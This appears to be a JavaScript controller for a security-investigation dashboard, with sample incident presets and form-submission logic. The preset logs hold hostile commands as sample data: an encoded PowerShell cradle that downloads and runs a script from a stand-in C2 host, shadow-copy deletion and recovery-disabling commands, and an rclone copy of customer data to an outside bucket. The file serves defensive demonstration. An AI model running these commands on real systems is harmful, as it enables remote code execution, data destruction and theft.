/**
 * CyberMemory AI — New Investigation Controller & Presets
 * Author: Frontend & Dashboard Engineering
 */

const PRESETS = {
  'powershell-recall': {
    title: 'Obfuscated PowerShell Download Cradle Spawned by Word Macro',
    severity: 'High',
    alert_source: 'CrowdStrike Falcon EDR',
    affected_host: 'FIN-WKS-044',
    user: 'corp\\kpatel',
    description: 'Suspicious execution of hidden powershell.exe with Base64 payload initiated by WINWORD.EXE process.',
    raw_logs: `EventID: 4688
ProcessName: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
ParentProcessName: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE
CommandLine: powershell.exe -w hidden -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbABkAG8AbQBhAGkAbgAuAHgAeQB6AC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA==
NetworkConnection: 198.51.100.44:8080 (c2.evildomain.xyz)
MD5: 7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1f`
  },
  'ransomware-canary': {
    title: 'Mass File Encryption & VSS Shadow Copies Deletion Activity',
    severity: 'Critical',
    alert_source: 'SentinelOne Sentinel Agent',
    affected_host: 'STORAGE-SRV-01',
    user: 'NT AUTHORITY\\SYSTEM',
    description: 'Critical ransomware heuristic: vssadmin execution followed by automated extension mutation to .locked.',
    raw_logs: `Alert: Ransomware Canary Triggered
Process: C:\\Windows\\System32\\vssadmin.exe delete shadows /all /quiet
Followup: bcdedit.exe /set {default} recoveryenabled No
FileModificationCount: 380 files per minute
TargetDirectories: D:\\CorporateShares\\*, E:\\Accounting\\*
Hash: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855`
  },
  'aitm-phish': {
    title: 'Impossible Travel & High-Risk OAuth Refresh Token Exchange',
    severity: 'High',
    alert_source: 'Microsoft Entra ID Protection',
    affected_host: 'AZURE-AD-IDENTITY',
    user: 'sarah.connor@cybermemory.ai',
    description: 'Simultaneous login attempts detected from Seattle, US and Frankfurt, DE within 8 minutes.',
    raw_logs: `Event: AADSTS50076 (StrongAuthenticationRequirement)
UserPrincipalName: sarah.connor@cybermemory.ai
Timestamp 1: 14:10:02 UTC | IP: 104.28.19.12 (Seattle, WA, US) | Platform: MacOS Chrome
Timestamp 2: 14:18:20 UTC | IP: 194.26.29.98 (Frankfurt, DE) | Platform: Windows NT Edge
Action: Exchange Online Mailbox Forwarding Rule Created -> target: invoice-sync-bot@proton.me`
  },
  's3-exfil': {
    title: 'Anomalous High-Volume Egress via Rclone to External Cloud Storage',
    severity: 'Critical',
    alert_source: 'Palo Alto Networks Cortex XDR',
    affected_host: 'VAULT-DB-NODE',
    user: 'root',
    description: 'Continuous 850 Mbps egress detected over TCP 443 to unapproved Amazon AWS S3 bucket.',
    raw_logs: `Proto: TCP 443
SrcIP: 10.20.5.12
DstIP: 52.216.142.9 (s3-us-west-2.amazonaws.com)
Process: /usr/local/bin/rclone copy /var/data/customer_vault/ remote:data-dump-bucket-912
Transferred: 48.7 GB in 35 minutes`
  }
};

function loadPreset(key) {
  const p = PRESETS[key];
  if (!p) return;

  document.getElementById('incident-title').value = p.title;
  document.getElementById('incident-severity').value = p.severity;
  document.getElementById('alert-source').value = p.alert_source;
  document.getElementById('affected-host').value = p.affected_host;
  document.getElementById('target-user').value = p.user;
  document.getElementById('alert-description').value = p.description;
  document.getElementById('security-logs').value = p.raw_logs;

  CyberSOC.showToast(`Loaded scenario preset: ${p.title}`);
}

function handleFileUpload(event) {
  const file = event.target.files[0];
  if (!file) return;

  const reader = new FileReader();
  reader.onload = (e) => {
    const content = e.target.result;
    const logsArea = document.getElementById('security-logs');
    if (logsArea) {
      logsArea.value = (logsArea.value ? logsArea.value + '\n\n' : '') + `--- Imported from ${file.name} ---\n` + content;
      CyberSOC.showToast(`Imported ${file.name} into logs area.`);
    }
  };
  reader.readAsText(file);
}

async function handleInvestigationSubmit(event) {
  event.preventDefault();

  const title = document.getElementById('incident-title').value.trim();
  const severity = document.getElementById('incident-severity').value;
  const alertSource = document.getElementById('alert-source').value.trim();
  const affectedHost = document.getElementById('affected-host').value.trim();
  const user = document.getElementById('target-user').value.trim();
  const description = document.getElementById('alert-description').value.trim();
  const rawLogs = document.getElementById('security-logs').value.trim();
  const useMemory = document.getElementById('toggle-memory-recall').checked;

  if (!title || !affectedHost || !rawLogs) {
    CyberSOC.showToast('Please fill all mandatory fields (Title, Host, Logs).', 'error');
    return;
  }

  // Show Modal
  const modalEl = document.getElementById('investigationModal');
  const modal = new bootstrap.Modal(modalEl);
  modal.show();

  const payload = {
    title,
    severity,
    alert_source: alertSource,
    affected_host: affectedHost,
    user,
    description,
    raw_logs: rawLogs,
    use_memory: useMemory
  };

  try {
    // Stage 1: Parsing
    updateProgressStep(1, 20, 'Parsing incoming telemetry...', 'Validating syntax and extracting process tokens.');
    await sleep(400);

    // Stage 2: IOC Extraction
    updateProgressStep(2, 45, 'Extracting IOCs & Threat Indicators...', 'Searching for IP addresses, hashes, command lines and ATT&CK mappings.');
    await sleep(450);

    // Stage 3: Hindsight Memory Recall
    updateProgressStep(3, 70, 'Querying Hindsight Memory Bank...', 'Semantic similarity search against historical resolved incidents.');
    
    // Fire real API request
    const responsePromise = CyberMemoryAPI.investigate(payload);

    await sleep(450);
    // Stage 4: LLM Reasoning
    updateProgressStep(4, 90, 'LLM Reasoning & Hypothesis Synthesis...', 'Correlating observed indicators against historical remediation playbooks.');

    const result = await responsePromise;

    // Stage 5: Finalized
    updateProgressStep(5, 100, 'Investigation Complete!', 'Generated context-aware report.');
    await sleep(400);

    modal.hide();

    if (result && result.incident_id) {
      window.location.href = `/investigation/${result.incident_id}`;
    } else {
      window.location.href = '/dashboard';
    }
  } catch (err) {
    console.error('Investigation error:', err);
    modal.hide();
    CyberSOC.showToast(`Investigation failed: ${err.message}`, 'error');
  }
}

function updateProgressStep(stepNum, percent, title, desc) {
  const pBar = document.getElementById('analysis-progress-bar');
  const titleEl = document.getElementById('analysis-step-title');
  const descEl = document.getElementById('analysis-step-desc');

  if (pBar) pBar.style.width = `${percent}%`;
  if (titleEl) titleEl.textContent = title;
  if (descEl) descEl.textContent = desc;

  for (let i = 1; i <= 5; i++) {
    const chk = document.getElementById(`chk-step-${i}`);
    if (!chk) continue;
    if (i < stepNum) {
      chk.className = 'd-flex align-items-center gap-2 text-success';
      chk.innerHTML = `<i class="bi bi-check-circle-fill"></i> <span>${chk.querySelector('span').textContent}</span>`;
    } else if (i === stepNum) {
      chk.className = 'd-flex align-items-center gap-2 text-cyan fw-semibold';
      chk.innerHTML = `<span class="spinner-border spinner-border-sm text-cyan me-1"></span> <span>${chk.querySelector('span').textContent}</span>`;
    } else {
      chk.className = 'd-flex align-items-center gap-2 text-muted';
      chk.innerHTML = `<i class="bi bi-circle"></i> <span>${chk.querySelector('span').textContent}</span>`;
    }
  }
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
